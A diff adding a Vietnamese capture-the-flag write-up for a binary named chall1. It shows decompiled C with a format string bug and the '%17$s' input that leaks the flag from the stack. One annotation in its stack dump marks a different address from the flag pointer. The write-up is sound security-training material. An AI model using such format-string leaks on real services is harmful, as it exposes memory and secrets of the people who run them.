@@ -50,5 +50,51 @@ duplicate
 [*] Stopped process './bof' (pid 1852)
 ```
 
+## chall1
+```C
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  char s[136]; // [rsp+0h] [rbp-90h] BYREF
+  unsigned __int64 v5; // [rsp+88h] [rbp-8h]
 
+  v5 = __readfsqword(0x28u);
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  setbuf(stderr, 0LL);
+  printf("Enter your name: ");
+  fgets(s, 127, stdin);
+  printf("Hello ");
+  printf(s); // -> format
+  putchar(10);
+  return 0LL;
+}
+```
+Mình sẽ dùng format '%s' để lấy ra được flag.
+Đặt break point ở 0x13F7 (`0x5555555553f7`) ta thấy flag được lưu tại `0x555555559690`
+```
+RSI  0x555555559690 ◂— 'w1{good_job_;)}\n'
+```
+Sau đó mình check xem thử trong stack địa chỉ này nằm ở đâu, thì mình thấy nó nằm ở vị trí thứ 16 trong stack.
+```
+pwndbg> x/20xg $sp
+0x7fffffffdd00: 0x0000000300000000       0x0000000000000020
+0x7fffffffdd10: 0x0000000000000020       0x0000000000000007
+0x7fffffffdd20: 0x00005555555592a0       0x0000555555559330
+0x7fffffffdd30: 0x00005555555593c0       0x0000555555559450
+0x7fffffffdd40: 0x00005555555594e0       0x0000555555559570
+0x7fffffffdd50: 0x0000555555559600       0x0000555555559690
+0x7fffffffdd60: 0x0000555555559720       0x00005555555597b0
+0x7fffffffdd70: 0x0000555555559840       0x00005555555598d0
+0x7fffffffdd80: 0x0000555555559960->here 0x00005555555599f0  
+0x7fffffffdd90: 0x0000555555559a80       0x0000555555559b10
+```
+Vậy nên mình sẽ nhập vào `%17$s` để có được flag.
+```
+pwndbg> run
+Starting program: /mnt/d/New/ubuntu/task/re_pwn/pwn-23-8/chall1/chall1
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Enter your name: %17$s
+Hello w1{good_job_;)}
+```
 
